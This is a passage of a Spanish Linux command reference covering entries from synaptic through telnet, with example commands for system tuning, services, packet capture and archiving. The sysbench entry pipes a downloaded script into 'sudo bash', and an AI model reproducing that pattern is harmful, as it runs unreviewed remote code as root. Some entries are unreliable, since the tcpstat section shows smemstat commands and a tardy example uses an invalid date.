$ sxiv imagen.png


synaptic
Interfaz gráfica para apt, sistema de gestión de paquetes basadas en Debian.
Atajos de teclado:
Ctrl + f (Buscar paquete)
Ctrl + r (Refrescar lista de paquetes)
Ctrl + g (Marcar todas las actualizaciones)
Ctrl + p (Aplicar los cambios)
Ctrl + q (Salir)


sync
Sincroniza memoria y disco [escribe el contenido de los buffers en disco]
$ sync
# sync; init 0 (Sincronizar y apagar el equipo)


synclient
Consultar/modificar las opciones del touchpad
$ synclient -l (Ver la configuración)
$ synclient TapButton1=1 TapButton2=2 VertEdgeScroll=1 (Activar el click y el escroll. Para hacerlo permanente poner la linea en el inicio [en fluxbox sería en /.fluxbox/startup]


sysbench
Utilidad para medir el rendimiento de un ordenador.
Descarga e instalación:
	$ curl -s https://packagecloud.io/install/repositories/akopytov/sysbench/script.deb.sh | sudo bash
	# apt -y install sysbench
$ sysbench --test=cpu --cpu-max-prime=20000 run (test para la CPU)
$ sysbench memory --threads=2 run (testear la memoria)
$ sysbench --test=cpu --cpu-max-prime=50000 --num-threads=6 run (Con este test medimos la velocidad de la CPU. num-threads indica el número de núcleos a usar)


sysctl
Muestra la configuración de los parámetros del kernel
# sysctl -a | more (Muestra todas las [muchisimas] variables)
# sysctl fs.file-max     (máximo de ficheros que pueden abrirse en el sistema)
# sysctl fs.file-max=256000   (modificarlo a 256000)
# sysctl -w vm.swappiness=10 (usar más memoria RAM y menos SWAP)
# sysctl kernel.panic=5 (forzar reinicio a los 5 segundos despues de un kernel panic)
Para hacer los cambios permanentes añadir las lineas al archivo /etc/sysctl.conf:
# echo "kernel.panic=5" >> /etc/sysctl.conf
# echo "vm.swappiness=10" >> /etc/sysctl.conf
Otros ajustes que podemos hacer en este archivo que mejoran el rendimiento del sistema son:
# echo "vm.vfs_cache_pressure = 50" >> /etc/sysctl.conf (reducir intercambio de información entre disco duro y memoria RAM)
# echo "vm.watermark_scale_factor = 200" >> /etc/sysctl.conf (cantidad de información en la memoria que será paginada al disco)
# echo "vm.dirty_ratio = 3" >> /etc/sysctl.conf (reducir la transferencia de la cantidad paginada)
# sysctl -w kernel.perf_event_paranoid=1 (ajustar a usuarios regulares el acceso a eventos del kernel [ver linux-perf])
1.-
Liberar memoria ram:
# watch -n 1 free -m (Comprobar el estado actual)
# sync && sysctl -w vm.drop_caches=3
# watch -n 1 free -m (Volver a lanzar el primer comando para ver la diferencia)


sysdig
[falcosecurity-scap-dkms]. Herramienta de exploración y resolución de problemas a nivel de sistema. Sysdig instrumenta las máquinas físicas y virtuales a nivel de sistema operativo instalándose en el kernel y capturando llamadas del sistema [syscalls] y otros eventos del sistema. Luego, puede filtrar y decodificar estos eventos para extraer información y estadísticas útiles. Incluye las herramientas csysdig y scap-driver-loader
# sysdig (listar todas las syscalls en tiempo real)
# sysdig "fd.name=/etc/passwd" (muestra solo los eventos relacionados con el archivo /etc/passwd)
# csysdig (abrir un interfaz tipo "top" donde se puede ver procesos, archivos accedidos, uso de CPU... todo basado en los datos capturados por falcosecurity-scap-dkms)
# sysdig -cl (listado de opciones disponibles)
# sysdig -c netstat (monitorearlas conexiones de red)
# sysdig -c httplog (visualización de registros HTTP)
# sysdig -c topprocs_cpu (monitoreo de procesos por uso de CPU)
# sysdig -c spy_users (monitoreo de la actividad de los usuarios)


syslinux
Hacer particiones arrancables
$ syslinux /dev/sda1


syslinux-utils
Conjunto de cargadores de arranque que actualmente admite sistemas de archivos DOS FAT y NTFS (SYSLINUX), sistemas de archivos Linux ext2/ext3/ext4, btrfs y xfs (EXTLINUX), arranques de red PXE (PXELINUX) o CD-ROM ISO 9660 (ISOLINUX). Contiene las utilidades auxiliares: gethostip, isohybrid, isohybrid.pl, lss16toppm, md5pass, memdiskfind, mkdiskimage, ppmtolss16, pxelinux-options, sha1pass y syslinux2ansi.



syslogout
Configuración diseñado para funcionar con bash para un mantenimiento de las partes del shell encargada de cerrar sesión y que permite o prohibe el cierre de sesión del shell para todos los usuarios del sistema de forma modular y centralizada. No es un ejecutable ni un daemon. Las configuraciones se encuentran en $HOME/.bash_logout, /etc/syslogout y /etc/syslogout.d/


sysnews
Programa para mostrar noticias entre usuarios del sistema. Cada noticia se encuentra en un archivo independiente en el directorio /var/lib/sysnews. Cualquier persona con permiso de escritura en este directorio puede crear un archivo news.
$ nano /var/lib/sysnews/noticia (enviar noticia, por ejemplo con el texto: ¡Atención! Se ha actualizado el kernel del sistema. Reinicie para aplicar cambios)
$ rm /var/lib/sysnews/noticia (eliminar el archivo, cuando ya no es relevante)
$ news -a (muestra todas las noticias, incluyendo las ya leídas)
$ news -s (número de artículos de noticias)
$ news -n -l (muestra solo los nombres de los artículos de noticias y uno por linea)
$ news -e 10 -x noticia1 noticia3 (que las noticias caduquen a los 10 dias excepto noticia1 y noticia3)


sysstat
Herramientas para monitorear el rendimiento del sistema, permitiendo ver estadísticas sobre CPU, memoria, disco, red, procesos, etc. Incluye cifsiostat, iostat, mpstat, pidstat, sadf, sar.sysstat y tapestat
$ iostat -x 2 3 (muestra estadísticas extendidas de E/S cada 2 segundos, 3 veces)
$ iostat -xz 1 (ver el uso de disco y latencia)
$ mpstat -P ALL 1 (muestra el uso de cada CPU cada segundo)
$ pidstat 1 (muestra el uso de recursos por proceso cada segundo)
$ pidstat -r -u 1 (ver qué procesos consumen más CPU y memoria)
$ sar -u 1 5 (muestra uso de CPU cada segundo por 5 veces)
$ sar -u -f /var/log/sysstat/sa23 (ver histórico de CPU si se tiene recolección habilitada en /etc/default/sysstat)
$ sadf -d /var/log/sysstat/sa17 -- -u (muestra estadísticas de CPU del archivo histórico sa17 en formato delimitado [CSV])
$ cifsiostat -t 1 (muestra estadísticas de CIFS cada segundo)
$ tapestat (muestra información de acceso a dispositivos de cinta)
1.-
Para habilitar recolección histórica (sar):
# nano /etc/default/sysstat
        ENABLED="true"
Reiniciar el servicio
# systemctl restart sysstat


system-config-printer
Gestor de impresoras. Lanza la gui.
$ system-config-printer


systemctl
[systemd-sysv]. Systemd es un administrador del sistema y gestor de servicios compatible con SysV al que reemplaza.
# systemctl reboot (Reiniciar el pc)
# systemctl poweroff (Parar el sistema)
# systemctl suspend (Suspender el sistema)
# systemctl hibernate (Poner el sistema en hivernación)
# systemctl (Listado de unidades activas)
# systemctl --failed (Listado de unidades que han tenido problemas)
# systemctl list-units (Listado de unidades activas)
# systemctl list-unit-files --all (listar todos los archivos de unidad instalados: enabled, disabled, static..)
# systemctl list-units --type=target (listar targets activos)
# systemctl list-units --type=service (servicios cargados)
# systemctl list-dependencies ssh.service (servicios que se han de iniciar antes de iniciar el servicio requerido)
# systemctl start slim.service (Activa slim de inmediato)
# systemctl stop sshd.service (Parar ssh de inmediato)
# systemctl restart apache2.service (Reiniciar el servicio apache)
# systemctl reload wicd.service (Recargar la configuración de wicd)
# systemctl status cron.service (Muestra el estado de cron)
# systemctl is-active ssh.service (verificar si un servicio está activo)
# systemctl is-enabled cups (Comprueba si cups está habilitada o no)
# systemctl is-failed mysql (comprueba si un servicio falla)
# systemctl enable NetworkManager.service (Activa el inicio automático de network-manager en el arranque)
# systemctl disable smbd.service (Desactiva el inicio automático de samba en el arranque)
# systemctl daemon-reload (Recarga systemd, escaneando en busca de unidades nuevas o modificadas)
# systemctl isolate multi-user.target (Arrancar en runlevel 3)
# systemctl isolate graphical.target (Arrancar en runlevel 5)
# systemctl -r --type service --all (mostrar los servicios, activos o no, disponibles en el sistema)
# systemctl --type=service --state=running (los servicios que estan activos)
# systemctl --type=service --state=running | grep cups.service (ver si un servicio está activo)
# systemctl --type=service --state=failed,exited (ver estado de dos servicios)
1.-
Para incorporar el arranque a grub2, modificar del archivo:
# nano /etc/default/grub
La linea:
	GRUB_CMDLINE_LINUX_DEFAULT="quiet init=/bin/systemd"
2.-
Para que al bajar la tapa de un portatil el sistema no se suspenda.
# nano /etc/systemd/logind.conf
Y modificar la linea:
	HandleLidSwitch=ignore
3.-
Para cambiar el nivel de ejecución predeterminado del sistema, que con sysvinit se hacía editando /etc/inittab y modificando la linea id:5:initdefault:, con systemd se hace:
# ln -sf /lib/systemd/system/graphical.target /etc/systemd/system/default.target
4.-
Para acelerar el proceso de inicio y finalización:
# /etc/systemd/system.conf
Y descomentar y modificar las lineas siguientes de 90 segundos a 10:
	DefaultTimeoutStartSec=10s
	DefaultTimeoutStopSec=10s


systemd-analyze
Analiza la secuencia de arranque en sistemas basados en systemd (Ver systemctl)
# systemd-analyze time (muestra el tiempo total del arranque del sistema, desglosando el tiempo en espacio de usuario, del kernel y en la carga del initrd)
# systemd-analyze blame (procesos que se ejecutan y cuanto tiempo consumen)
# systemd-analyze critical-chain (ver cuellos de botella en el arranque)
# systemd-analyze plot > archivo.svg (mostrar un gráfico con los tiempos del arranque)
# systemd-analyze dump (volcar todo el arranque)


systemd-bootchart
Herramienta gráfica de rendimiento de arranque. systemd-bootchart es una herramienta que, por lo general, se ejecuta al iniciar el sistema y que recopila la carga de la CPU, la carga del disco, el uso de la memoria y la información por proceso de un sistema en ejecución. Los resultados recopilados se muestran como un gráfico SVG.
Para habilitar systemd-bootchart:
# nano /etc/default/grub
Y modificar la linea:
            GRUB_CMDLINE_LINUX_DEFAULT="init=/lib/systemd/systemd-bootchart"
# update-grub (actualizar grup)
Después del arranque, el gráfico SVG se genera en /run/log/bootchart-XXXX.svg [las "X" son la fecha de arranque]:
$ inkscape /run/log/bootchart-20250202-1707.svg (para visualizarlo)
Nota.- El gráfico se almacena en /run/log/, por lo que se perderá tras un reinicio a menos que se copie en otro lugar.


systemd-coredump
Herramientas para almacenar en un formato estructurado y recuperar, con herramientas como gdb, volcados de memoria [core dumps] de aplicaciones que fallan. Estos volcados de memoria son instantáneas del espacio de memoria de un proceso en el momento en que se produce un fallo, y son útiles para el análisis de errores y la depuración y se almacenan en /var/lib/systemd/coredump/.
$ coredumpctl list (lista de los volcados de memoria disponibles, junto con información sobre el proceso que falló)
$ coredumpctl gdb <PID> (<PID> es el identificador del proceso que aparece en la lista de coredumpctl list. Esto abrirá gdb con el binario correspondiente y el core dump cargado)
$ coredumpctl dump <PID> > mi_volcado.core (guardará el core dump en un archivo llamado mi_volcado.core)


systemd-resolved
Herramienta para gestionar y consultar la configuración del resolver DNS en sistemas que usan systemd. La instalación de este paquete automáticamente sobreescribe /etc/resolv.conf y cambia para ser administrado por systemd-resolved. Incluye las herramientas resolvconf [herramienta principal para consultar y modificar la configuración DNS en tiempo real en un sistema que utiliza systemd-resolved] y resolvectl [gestionar dinámicamente el archivo /etc/resolv.conf agregando o eliminando servidores DNS].
$ resolvectl status (muestra una visión general de la configuración de DNS y resolución de nombres, incluyendo los servidores DNS configurados, los dominios de búsqueda y el modo de resolución)
$ resolvectl query example.com (devuelve la dirección IP asociada con example.com)
$ resolvectl dns eth0 8.8.8.8 1.1.1.1 (asigna los servidores DNS 8.8.8.8 y 1.1.1.1 a la interfaz eth0)
$ resolvectl revert eth0 (elimina cualquier configuración DNS personalizada en la interfaz eth0, volviendo a la configuración predeterminada)
$ resolvectl domain eth0 example.com (configura example.com como el dominio de búsqueda predeterminado para la interfaz eth0)
# echo "nameserver 8.8.8.8" | resolvconf -a eth0 (agregar 8.8.8.8 como servidor DNS para la interfaz eth0 en /etc/resolv.conf)
# resolvconf -d eth0 (elimina cualquier configuración DNS específica de la interfaz eth0)
Para verificar el contenido de resolv.conf:
# cat /etc/resolv.conf


systune
Este programa escribe los parámetros del núcleo, previamente guardados en un archivo de configuración, en el sistema de archivos /proc. Esto permite ajustar el rendimiento del kernel sin volver a compilarlo. Systune se inicia después de la mayoría de los demonios y otros scripts de init.d, por lo que puede usarse como sysctl de "segunda etapa".


sysvbanner
Muestra, horizontalmente, un texto de 'banner' de la misma manera que lo hace el banner de System V. Este paquete proporciona los comandos banner y sysvbanner
$ sysvbanner linux


sysv-rc-conf
Gestionar el arranque de las aplicaciones al inicio.
# sysv-rc-conf


t1utils
Colección de programas para la manipulación de fuentes Type 1 [PostScript Type 1]. Las herramientas t1utils permiten convertir entre formatos PFA (ASCII) y PFB (binario); desensamblar archivos PFA o PFB a formato legible; y reensamblar estos archivos a formato PFA o PFB. También se pueden extraer recursos de fuentes de un archivo de fuentes Macintosh (ATM/Laserwriter) o crear un archivo de fuentes Macintosh Type 1 a partir de una fuente PFA o PFB. Incluye las aplicaciones t1ascii, t1asm, t1binary, t1disasm, t1mac y t1unmac
$ t1binary cmr10.pfa cmr10.pfb (convierte fuente.pfa [ASCII] a fuente.pfb [binario])
$ t1ascii fuente.pfb fuente.pfa (convierte fuente.pfb [binario] a fuente.pfa [ASCII] y guarda el resultado en el archivo fuente.pfa)
$ t1ascii Palatino-Bold.pfb Palatino-Bold.pfa (lo mismo)
$ t1asm Helvetica-Oblique.t1a > Helvetica-Oblique_new.pfa (reensambla el archivo de texto legible a un formato de fuente PFA)
$ t1disasm fuente.pfb > fuente_desensamblada.txt (desensambla fuente.pfb y guarda el resultado en fuente_desensamblada.txt)
$ t1disasm Helvetica-Oblique.pfb > Helvetica-Oblique.t1a (desensambla una fuente, PFA o PFB, en un formato de texto legible con extensión .t1a por convención)
$ t1mac fuente.pfb fuente_mac.bin (convierte fuente.pfb a un archivo de fuente Type 1 para Macintosh y guarda el resultado en fuente_mac.bin)
$ t1unmac fuente_mac.bin > fuente.pfb (extrae la fuente del archivo fuente_mac.bin [Macintosh] y la guarda como fuente.pfb)


tac
Muestra el fichero por consola, al revés. De la última linea a la primera
$ tac archivo.txt


tail
muestra las últimas 10 lineas de un fichero (si no se especifica otra cantidad)
# tail /var/log/apache2/access.log
# tail -f /var/log/apache2/access.log (Actualiza los logs cada segundo)
# tail -50 /var/log/apache2/access.log  (muestra las últimas 50)
# tail -f /var/log/httpd/access_log /var/log/fail2ban.log (Abrir dos archivos)
# tail -s 5 archivo.log (Actualiza cada 5 segundos)


taktuk
Permite ejecutar comandos en paralelo en un conjunto potencialmente grande de nodos remotos, usando ssh para conectarse a cada nodo.
# taktuk -s -m host_remoto.com broadcast exec [ hostname ] (autopropagar [s] en host_remoto.com [m] el comando "hostname")
Nota- "broadcast exec [ ... ]" es un comando que será ejecutado por el intérprete de taktuk y "autopropagar" se refiere a si en los host remotos no está instalado taktuk
# taktuk -m host_remoto.com (modo interactivo y estando taaktuk instalado en host_remoto.com)
# taktuk -s -m host1 -m host2 -m host3 broadcast exec { uptime } (autopropagar a tres host especificados el comando "uptime")
# taktuk -s -f hosts broadcast exec { uptime } (Lo mismo pero los host estan especificados en el archivo hosts [f])


talk
Entablar conversaciones con usuarios conectados a nuestro sistema o remotos
$ talk usuario ttyx  (Conectar con usuarios locales)
$ talk usuario@IP_o_Host (Con un usuario remoto [UNIX])


tapestat
[sysstat]. Utilidad para supervisar la actividad de las unidades de cinta conectadas a un sistema.
# tapestat -y (omitir el tiempo transcurrido desde que se inició el sistema)
# tapestat --human (presentación en formato legible [23M, 55k...])


taptempo
Presionar la tecla Intro al ritmo de una canción que se está escuchando se obtiene el número correspondiente de latidos por minuto [bpm=beats-per-minute]. Equivale al tempo ejecutado por un metrónomo.
$ taptempo


tar
[gzip bzip2 unzip tar unrar] Empaquetar y comprimir archivos y/o directorios.
$ tar -cf archivo.tar dir (Crear paquete .tar)
$ tar -xf archivo.tar (Descomprimir un .tar)
$ tar -tf archivo.tar (Listar contenido)
$ tar -cf archivo.tar.gz dir (Crear paquete tar.gz)
$ tar -xf archive.tar.gz (Descomprimir un tar.gz)
$ tar -cf archivo.tgz dir (Crear paquete .tgz)
$ tar -xf archivo.tgz (Descomprimir un .tgz)
$ tar -tf archivo.tgz (Listar contenido)
$ tar -cf archive.xz dir (Crear paquete .xz)
$ tar -xf archive.xz (Descomprimir paquete . xz)
$ tar -cf archivo.tbz dir (Empaquetar y comprimir)
$ tar -xf archivo.tbz (Desempaquetar y descomprimir)
$ tar -tf archivo.tbz (Ver contenido)
$ tar -cf archivo.tar.bz2 dir (Crear paquete .tar.bz2)
$ tar -xf archivo.tar.bz2 (Descomprimir archivo .tar.bz2)
Opciones:
	-z (Comprimir/descomprimir usando gzip)
	-c (Crear un nuevo archivo)
	-v (mostrar proceso)
	-f (archivo (nombre de archivo)
	-x (extraer el contenido del archivo comprimido)
	-t (listar contenido de un archivo)
	-j  (comprimir/descomprimir con bzip2)
Otros casos:
$ tar -cf - file/ | gpg -c > file.cript (empaquetar y encriptar un archivo)
$ tar -c ficheros | bzip2 > archivo.tar.bz2 (Empaquetar ficheros y comprimir)
$ tar -cvzf archivo.tar.gz /home/usuario --exclude=videos (Empaquetar el directorio del usuario exluyendo el directorio videos)
$ tar -cvfz archivo.tgz --exclude="home/usuario/Descargas" /home/usuario/* (Lo mismo de otra forma)
$ tar -cvzf archivo.tar.gz –exclude={*.iso,videos} /home/usuario (Otra forma de empaquetar el direcotorio del usuario excluyendo todas las iso y la carpeta videos)
$ tar -jxf archivo.tbz -C /tmp (Descomprimir en otra carpeta)
$ tar -cvfz archivo.tgz --exclude="home/usuario/Descargas" --exclude=”home/usuario/videos /home/usuario/* (Otra forma de especificar las carpetas excluidas)
$ tar -czf - Images | ssh 192.168.1.15 'cat > ~/Images.tar.tgz' (Crear un tar de un directorio y mandarlo a un host remoto por ssh donde creará en el directorio personal el paquete Images.tar.gz)


tarcat
Concatena por pantalla los contenidos de archivos de texto o comprimidos con tar.
$ tarcat file1.tar file2.tar file3.tar
$ tarcat file1.txt file2.txt file3.txt


tardy
Se utiliza para manipular las cabeceras dentro de archivos comprimidos [.tar, .zip, etc].
$ tardy -eXtract archivo.tar archivo
$ tardy --modify /new/path/ /archive.tar (cambia la ruta interna de los archivos dentro del .tar para que estén en el directorio /new/path/ sin modificar el contenido real)
$ tardy --list archive.tar (lista las cabeceras de los archivos dentro del .tar para ver la estructura interna del archivo comprimido)
$ tardy --set-date "2024-15-05" archive.tar (modificar la fecha del archivo comprimido)
$ tardy --strip 2 archive.tar (elimina los dos primeros niveles de directorios en las rutas de los archivos dentro del .tar)
$ tardy --create --modify /new/path/ /nuevo.tar file1 file2 (crea nuevo.tar donde los archivos file1 y file2 se encuentran bajo /new/path/)


task
[taskwarrior]. Gestor de tareas minimalista.
$ task add Titulo Entrada (añadir una tarea)
$ task list (ver la lista de tareas)
$ task 1 done (marcar una entrada como completada)
$ task add project:DocsPendientes Titulo Entrada (organizar en proyectos)
$ task add recur:monthly (programar tareas que se repiten en el tiempo)
$ task add pri:H Titulo Entrada (establecer prioridades: H=high, M=medium, L=low)
$ $ task all (ver incluso las taareas vencidas)
$ task 5 start (indicar que la tarea 5 ha empazado)
$ task 5 modify due:'2024-12-15' (o que la dejamos para otro dia)
$ task project:DocsPendientes (ver todas las tareas dentro del proyecto mencionado)
$ task -tag list (lista todas las tareas sin el tag "tag")
$ task +tag list (lista todas las tareas con el tag "tag")
$ task long (ver las tareas en formato largo)
$ task +WEEK list (lista las tareas con el deadline de esta semana)
$ task +DUETODAY list (lista todas las tareas con el deadline de hoy)
$ task due.after:yesterday and due.before:thursday (filtraar de forma más especifica)
$ task 5 project:DocsPendientes (añadir a la tarea 5 al proyecto DocsPendientes)


tasksel
Interfaz para la instalación de grupos de paquetes relacionados con un propósito común, como pilas LAMP, servidores de correo, entornos de escritorio...
# tasksel (abre la interfaz)
# tasksel --list (mostrará una lista de todos los paquetes disponibles)
# tasksel install lxde-desktop (instalar un determinado escritorio)
# tasksel remove lxde-desktop (desinstalarlo)


tbench
Herramienta utilizada para simular cargas de trabajo en servidores de archivos utilizando un modelo cliente-servidor. Esta herramienta es útil para medir el rendimiento del almacenamiento o la red en un entorno de pruebas.
$ tbench_srv (inicia el servidor que tbench utilizará para las pruebas)
$ tbench 4 localhost (en otra terminal, se ejecuta el cliente, en este caso simula 4 clientes conectados al servidor en localhost)
$ tbench -t 60 8 localhost (ejecuta la prueba durante 60 segundos con 8 clientes conectados al servidor)
$ tbench 8 servidor-remoto (simula 8 clientes conectándose a un servidor remoto)


tc
Controlar, clasificar, dar forma y programar el tráfico de la red.
# tc qdisc
# tc -c -d qdisc
# tc -g class show dev enp1s0 (Muestra clases como gráfico ASCII en la interfaz enp1s0)
# tc qdisc show dev enp0s0


tcc
[Tiny C Compiler]. Compilador de C. Su objetivo no es tanto la optimización máxima del código, sino la velocidad de compilación y la facilidad de uso.
Ejemplo rápido:
$ nano hola.c
        #include <stdio.h>
        int main() {
            printf("Hola desde TinyCC\n");
            return 0;
        }
$ tcc hola.c -run (compila el archivo C y lo ejecuta directamente sin generar ejecutables intermedios)


tcpbench
Herramienta que realiza evaluaciones comparativas de rendimiento y muestreo simultáneo de variables de red del kernel.
$ tcpbench -n (modo servidor, donde escuchará todos interfaces para conexiones entrantes)
$ tcpbench 127.0.0.1


tcpdump
Capturar el trafico de la red.
# tcpdump -D (Ver las distintas redes disponibles)
# tcpdump -nni any (Capturar todas las interfaces de red del equipo)
# tcpdump -n -i eth0 -s 1515 -w archivo (que la información se guarde en archivo)
# tcpdump -n -i eth0 -s 1515 -l | tee archivo (verlo en pantalla y que se guarde en archivo)
# tcpdump -n -r archivo -c 4 (analizar ficheros)
# tcpdump -n -r archivo udp (filtrar por protocolos - udp, tcp, icmp, arp ...)
# tcpdump -n -r archivo -c 2 not tcp (con operadores booleanos [not, and]. Ver las 2 primeras capturas que no sean tcp)
# tcpdump -n -r archivo -c 2 not tcp and not udp (Ver las 2 primeras capturas que no sean tcp ni udp)
# tcpdump -n -r archivo -c 2 tpc and dst port 25 (Ver las 2 primeras capturas tcp y dst con destino al puerto 25)
# tcpdump -enni eth0 (info de la capa de enlace y MACs origen y destino)
# tcpdump host 192.168.1.3 (Capturar todo el tráfico del host especificado)
# tcpdump src net 192.168.1.0/28 (Especificando una red)
# tcpdump src host 192.168.1.3 (Solo lo que salga de la IP especificada)
# tcpdump dst port 23 (Todo el trafico que vaya dirigido al puerto 23)
# tcpdump udp and dst port 53 (Capturar tráfico de comunicación con las DNS)
# tcpdump tcp and not port 80 (Capturar todo el tráfico excepto el web)
# tcpdump tcp and port 80 (Capturar solo el web)
# tcpdump -i eth0 port not 80 and host www.google.com (Para saber si google manda “cosas” por otros puertos que no sean el 80)
# tcpdump -n -i eth1 -X tcp (Ver información del contenido de los paquetes)
# tcpdump ether src 01:20:21:00:00:B2 (Captura tráfico de la mac)
# tcpdump udp and dst port 53 (Capturar peticiones DNS)
# tcpdump tcp and (port 22 or port 23) (Capturar el tráfico telnet y ssh)
# tcpdump portrange 21-23 (tráfico origen/destino de los puertos 21, 22 o 23)
# tcpdump -n -i eth1 -X -s 200 port 9001 (de un puerto concreto)
# tcpdump -v -i eth1 port 9001 | awk '{print$1,$2,$3}'
# tcpdump port 9001 (Capturar todo el tráfico del puerto especificado)
Algunas opciones:
-n (Para no resolver las direcciones IP)
-i (Indica la interfaz de red)
-s (volumen de la parte del paquete que queremos capturar [1515 es suficiente])
-c (cantidad de mensajes a visualizar)
-p (no cambia la interfaz a modo promiscuo)
-x (ver los contenidos de los paquetes)
-r archivo (Para leer los datos de un archivo guardado con la opción -w)
src (Dirección y puerto origen)
dst (Dirección y puerto destino)
1.-
Ejemplo de un proceso:
# tcpdump -nni eth0 'port 80' -w /tmp/port.80 (Capturar el tráfico por el puerto 80 y mandarlo a un archivo)
# tcpdump -r /tmp/port.80 -nn (Análisis básico de los datos)
# tcpdump -r /tmp/port.80 -nn 'host !216.158.240.43' (Filtrar los datos descartando un host)
# tcpdump -r /tmp/port.80 -nn 'host !216.158.240.43' -w /tmp/port.80.b (Lo mismo enviando los nuevos datos a otro fichero)


tcpick
Muestra información sobre conexiones, carga, datos FTP, HTTPS, download...
# tcpick -i eth0 -C (con color)
# tcpick -i eth0 -C -a "port 80" (muestrar en color [C] y nombres de host [a] en un puerto)


tcpkill
[dsniff)]. Matar o impedir conexiones tcp.
# tcpkill -i eth1 host www.facebook.com (imposibilitará entrar en facebook)
# tcpkill -i eth0 host www.facebook twitter.com (especificar varias urls separadas por un espacio)
# tcpkill -i eth0 port 22 (especificando un puerto)


tcpstat
Informa de estadísticas de la red al igual que vmstat [ver] lo hace para las estadísticas del sistema. El valor predeterminado es 5 segundos.
# smemstat 4 3 (monitorear 3 veces cada 4 segundos)
# smemstat -dm -o smemstat.json (informe en megabytes, eliminando ruta del directorio y el resultado en el archivo smemstat.json)


tcptraceroute
Implementación de traceroute con paquetes TCP. traceroute [ver], envía paquetes UDP o ICMP ECHO con un TTL de uno, incrementándolo hasta alcanzar el destino. El problema radica en que, con el uso generalizado de firewalls, muchos de los paquetes que traceroute envía se filtran, lo que imposibilita rastrear completamente la ruta hasta el destino. Sin embargo, en muchos casos, los firewalls permiten la entrada de paquetes TCP a puertos específicos en los que los hosts que se encuentran detrás del firewall escuchan conexiones. Al enviar paquetes TCP SYN en lugar de paquetes UDP o ICMP ECHO, tcptraceroute puede eludir los filtros de firewall más comunes.
$ tcptraceroute google.com (forma básica)
$ tcptraceroute -v 8.8.8.8 (con más información)
$ tcptraceroute -p 80 google.com (con un puerto específico)
$ tcptraceroute -m 20 -w 2 -n example.com (máximo número de saltos, por defecto es 30, tiempo máximo entre paquetes en segundos y no realizar DNS lookup para nombres de host)


tcptrack
aplicación que muestra el consumo de la conexión.
# tcptrack -i eth1 port 22 -f (Especificando conexión, puerto y habilitar el algoritmo de velocidad media rápida [-f])
# tcptrack -i eth1 port 21 or 80 (Especificando dos puertos)
# tcptrack -i eth0 "dst port 80" (Sólo mostrar las conexiones destinadas al puerto 80)
# tcptrack -i eth1 -r 10 -d (Mostrar las conexiones 10 segundos más de cuando se cierren, por defecto son 2 segundo [r] y sin rastrear las conexiones existentes [d])
# tcptrack -T network.pcap > network.txt (Mandando el resultado a un archivo [-T])
Algunas teclas de control:
p (Pausar)
q (salir)
s (Cada vez que se pulsa la letra cambia a alguna de las 3 opciones de ordenación: sin ordenar (por defecto), por categoría y por bytes)


tdc
Reloj acoplable simple y pequeño. Es una herramienta útil para escritoprios OpenBox, FVWM, Enlightenment o ion3. Puede usar cualquier formato de fecha POSIX.
$ tdc (formato básico solo mostrando hora, minuto y segundo)
$ tdc -w 120 -f "%d/%m/%Y %H:%M" -ce -cl grey40 (con medida especificada [por defecto 64], determinado formato del dia [f] en el calendario [ce] y color grey40 [cl])
$ tdc -w 230 -f "%d %b %Y %T" (Otra presentación)


teclado
Ver setxkbmap.
Achivo de configuración:
# nano /etc/default/keyboard
	XKBMODEL="pc105"
	XKBLAYOUT="es,de,fr,us"
	XKBVARIANT="cat"
	XKBOPTIONS=""
	BACKSPACE="guess"
# dpkg-reconfigure keyboard-configuration
Reiniciar.
1.-
Con el paquete console-data
Al instalar el paquete, solicita la informacion del teclado, para modificarla:
# dpkg-reconfigure console-data
2.-
En ciertas ocasiones es necesario modificar del archivo:
# nano /etc/initramfs-tools/initramfs.conf
El parametro:
KEYMAP=y


tee
Muestra la salida de un comando en pantalla y al mismo tiempo la graba en un archivo
$ rkhunter -c -sk | tee rkhunter.txt
$ rkhunter -c -sk | tee -a rkhunter.txt (Añadirá la entrada al final del fichero)


telegram
[libreadline-dev libconfig-dev libssl-dev lua5.2 liblua5.2-dev]. Aplicación de mensajería instantanea más rápida, segura y libre que WhatsApp.
Descarga y compilación:
	$ wget https://github.com/vysheng/tg/archive/master.zip -O tg-master.zip
	$ unzip tg-master.zip
	$ cd tg-master
	$ ./configure
	$ make
Registro:
	$ ./telegram -k tg.pub (Solicita el número de móvil con el prefijo del país [+34xxxxxxxxx],
          al momento recibimos un sms con el número de código [xxxxx] que introduciremos en la terminal)
	$ ./telegram -N (Arrancar la aplicación lista para poder descargar fotos y videos)
Algunas teclas de control:
	help (Mostrar todos los comandos disponibles)
	msg contacto texto_a_enviar (Enviar mensaje a un contacto. Han de escribirse las primeras
         letras del contacto y pulsar tabulador para autocompletar)
	contact_list (Muestra la lista decontactos)
	suggested_contacts (Muestra sugerencias de contactos)
	add_contact núm_telefono nombre apellido (Añadir un contacto)
	chat_with_peer contacto (Xatear todo el rato con el mismo contacto)
	history contacto [limite] (Muestra la conversación con el contacto especificado. Si no se
         especifica limite,    por defecto son 40 lineas. Tambien pone como leidos todos los mesajes)
	dialog_list (Muestra mensajes pendientes)
	user_info contacto (Muestra información del contacto)
	stats (Muestra datos de nuestra cuenta)
	send_photo contacto archivo.jpg (Enviar a contacto una imagen)
	send_video contacto archivo.avi (Enviar un video a un contacto)
	send_text contacto archivo.txt (Enviar un texto a un contacto)
	fwd contacto id (Buscar el mensaje con el número de id especificado)
	mark_read contacto (Marcar todos los mensajes del contacto como leidos)
	rename_contact contacto nombre apellido (Renombrar un contacto)
	create_secret_chat contacto (Crear un chat privado con un contacto)
	set log_level 0 (Desactivar información de cuando se conectan los sontactos)
	set msg_num 1 (Antiva la numeración de los mensajes. con un valor 0 los desactiva)
	load_photo ID (Descargar una photo especificando el ID. Crea el dir ~/.telegram/download)
	load_video ID (Descarga un video)
	quit (Salir)
Otros valores para log_level:
	1 (imprime información acerca de los mensajes leídos)
	2 (imprime la línea, cuando alguien está escribiendo en el chat)
	3 (Informa cuando alguien cambia de estado en linea
1.-
Pra hacer permanentes algunas opciones:
$ nano .telegram/config
	log_level = 0;
	msg_num = 0;


telinit
Modifica o cambia el runlevel [inittab].
# telinit -t 10 6 (que reinicie [6] en 10 segundo [-t 10])
# telinit q (releer archivo de configuración si se ha modificado)


telnet
Protocolo que sirve para emular una terminal remota, con lo que permite ejecutar comandos introducidos con un teclado en un equipo remoto.
# telnet 123.86.22.190 (conectarse a un equipo remoto)
# telnet maquina_remota.com (especificando nombre del host)
# telnet 123.86.22.190 80 (conectarse a un equipo remoto con un puerto especifico)
Tambien puede usarse para comprobar localmente si un puerto está abierto:
# telnet 192.168.0.27 3000
Si la conexión está abierto muestra una salida:
